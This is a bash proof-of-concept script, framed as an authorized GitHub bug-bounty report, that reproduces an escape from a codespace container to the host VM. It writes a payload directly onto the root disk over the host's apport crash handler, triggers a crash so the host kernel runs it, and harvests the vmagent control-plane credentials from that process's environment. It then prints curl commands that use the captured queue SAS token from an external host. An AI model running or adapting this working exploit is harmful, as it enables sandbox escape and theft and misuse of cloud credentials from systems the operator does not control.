#!/bin/bash
# F-003 BLAST-RADIUS reproduction: VM escape -> vmagent control-plane credential harvest -> external auth oracle.
# Run inside any codespace whose repo contains this script:  bash repro-f003-blast.sh
# Authorized GitHub bug-bounty PoC (bounty.github.com scope). Run ONLY on a codespace you own.
# Effects on this VM: overwrites the first block of /usr/share/apport/apport on the OS disk and
# writes /HOST-BLAST. Both are ephemeral per-VM (OS disk is re-imaged on codespace recreate).
# Cleanup = delete the codespace afterward.
set -u
echo "[*] F-003 blast-radius repro start: $(date -u +%FT%TZ)"

# 1) locate the VM root disk (device ordering varies per boot)
D=""
for spec in 8:1 8:17 8:33 8:2 8:34; do
  maj=${spec%%:*}; min=${spec##*:}
  sudo rm -f /dev/rt; sudo mknod /dev/rt b "$maj" "$min" 2>/dev/null
  if sudo blkid /dev/rt 2>/dev/null | grep -q cloudimg-rootfs; then D=/dev/rt; break; fi
done
[ -z "$D" ] && { echo "[!] NO-ROOT-DISK. /sys/class/block:"; ls /sys/class/block; exit 1; }
echo "[+] FOUND-ROOT-DISK=$D"

# 2) container identity, for contrast with the host-side marker below
echo "[+] container: pidns=$(readlink /proc/self/ns/pid) cgroup=$(cat /proc/self/cgroup) pid1=$(cat /proc/1/comm)"

# 3) payload executed by the HOST kernel: escape proof + vmagent credential harvest
cat > /tmp/blastpay <<'PEOF'
#!/bin/sh
B=/HOST-BLAST
{
echo "WHEN $(date -u +%FT%TZ)"
echo "uid=$(id -u) gid=$(id -g)"
echo "pidns: $(readlink /proc/self/ns/pid)"
echo "mntns: $(readlink /proc/self/ns/mnt)"
echo "cgroup: $(cat /proc/self/cgroup 2>/dev/null)"
echo "ppid: $PPID comm: $(cat /proc/$PPID/comm 2>/dev/null)"
echo "argv: $@"
P=$(pgrep -f 'codespaces vmagent' | head -1)
echo "-- vmagent pid $P environ --"
tr '\0' '\n' < /proc/$P/environ 2>/dev/null | grep -aE '^VSOAGENT_'
} > $B 2>&1
exit 0
PEOF
SZ=$(wc -c < /tmp/blastpay); echo "[+] payload: $SZ bytes"
[ "$SZ" -gt 3900 ] && { echo "[!] payload too large"; exit 1; }

# 4) in-place first-block overwrite of the host crash handler, evict page cache, trigger
B1=$(sudo debugfs -R "blocks /usr/share/apport/apport" $D 2>/dev/null | grep -oE "[0-9]+" | head -1)
sudo dd if=/tmp/blastpay of=$D bs=4096 seek=$B1 conv=notrunc count=1 2>/dev/null
sudo sh -c 'echo 3 > /proc/sys/vm/drop_caches' && echo "[+] CACHES-DROPPED"
sudo debugfs -w -R "rm /HOST-BLAST" $D >/dev/null 2>&1
sudo sh -c 'ulimit -c unlimited; kill -SEGV $$' 2>/dev/null
echo "[+] trigger sent; waiting for journal commit..."

# 5) read back the host-written evidence
M=""
for i in 1 2 3 4 5 6; do sleep 10; M=$(sudo debugfs -R "cat /HOST-BLAST" $D 2>/dev/null); [ -n "$M" ] && break; done
echo "===== HOST-WRITTEN EVIDENCE (/HOST-BLAST on the VM root filesystem) ====="
if [ -z "$M" ]; then echo "[!] marker not found"; exit 1; fi
echo "$M"
echo "===== ESCAPE + CREDENTIAL HARVEST REPRODUCED ====="

# 6) emit the external auth oracle using the JUST-CAPTURED live values
SAS=$(echo "$M" | grep -a 'INPUTQUEUESASTOKEN=' | head -1 | sed 's/.*INPUTQUEUESASTOKEN=//')
QURL=$(echo "$M" | grep -a 'INPUTQUEUEURL=' | head -1 | sed 's/.*INPUTQUEUEURL=//' | tr -d '\r')
QNAME=$(echo "$M" | grep -a 'INPUTQUEUENAME=' | head -1 | sed 's/.*INPUTQUEUENAME=//' | tr -d '\r')
SASC=$(echo "$SAS" | sed 's/%3D$/X%3D/')
echo
echo "Now run FROM ANY EXTERNAL HOST (not this VM) to prove beyond-VM authentication:"
echo "  curl -s -D - -o /dev/null -w '\nHTTP %{http_code}\n' '${QURL}${QNAME}?comp=metadata&${SAS}'"
echo "Negative control (last sig char corrupted):"
echo "  curl -s -D - -o /dev/null -w '\nHTTP %{http_code}\n' '${QURL}${QNAME}?comp=metadata&${SASC}'"
echo "Expected: real SAS -> HTTP 200 + x-ms-approximate-messages-count header; control -> HTTP 403 AuthenticationFailed."
